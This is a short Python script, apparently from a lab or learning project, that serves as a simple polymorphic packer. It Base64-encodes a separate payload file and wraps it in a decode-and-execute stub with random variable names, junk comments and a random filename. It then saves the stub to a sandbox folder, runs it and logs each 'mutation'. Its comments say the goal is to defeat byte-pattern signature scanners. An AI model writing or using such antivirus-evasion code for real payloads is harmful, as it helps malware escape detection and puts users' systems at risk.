"""
 • Reads payload.py
 • Encodes it (Base64)
 • Generates a tiny decrypt-and-exec stub with random junk + filename
 • Saves stub inside sandbox/, executes it, and logs the mutation
"""
import base64, os, random, string, subprocess, textwrap, pathlib
from datetime import datetime
from pathlib import Path

# ---------- Paths ----------
ROOT = Path(__file__).resolve().parent.parent  
BOX  = ROOT / "sandbox"                               
BOX.mkdir(exist_ok=True)

# ---------- Read the payload ----------
PAYLOAD = (ROOT / "payload.py").read_text()

# ---------- Encode payload in base 64 ----------
# Base64 makes the body look like random text → every run gets a different string length 
# Signature scanners built on raw byte patterns no longer match
encoded = base64.b64encode(PAYLOAD.encode()).decode()

# ---------- Build decrypt stub ----------

# Store the decoded payload in a random variable
# Pull 6 random characters from the set abc..xyz in the form of list
# Join will make it into one string 
random_var = ''.join(random.choices(string.ascii_lowercase, k=6))

# Insert useless comments that will be ignored but do change the file's bytes
junk_comm = "# " + ''.join(random.choices(string.ascii_letters + ' ', k=30))

stub = textwrap.dedent(f"""
    {junk_comm}
    import base64, tempfile, importlib.util, os
    {random_var} = base64.b64decode('{encoded}').decode()

    # Write decoded payload to a temp file
    tmp = tempfile.NamedTemporaryFile('w', delete=False, suffix='.py')
    tmp.write({random_var})
    tmp.close()

    # Dynamically import and run the payload
    spec = importlib.util.spec_from_file_location("pl", tmp.name)
    mod  = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    # Clean up temp file
    os.remove(tmp.name)
""")

# ---------- Save stub to random filename ----------
clone_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".py"
clone_path = BOX / clone_name
clone_path.write_text(stub)

# ---------- Execute the clone ----------
subprocess.run(["python3", str(clone_path)])

# ---------- Log mutation ----------
with open(BOX / "mutation.log", "a") as log:
    log.write(f"[{datetime.now()}] Spawned {clone_name}  size = {clone_path.stat().st_size}\n")

print(f"Spawned and executed clone → {clone_path}")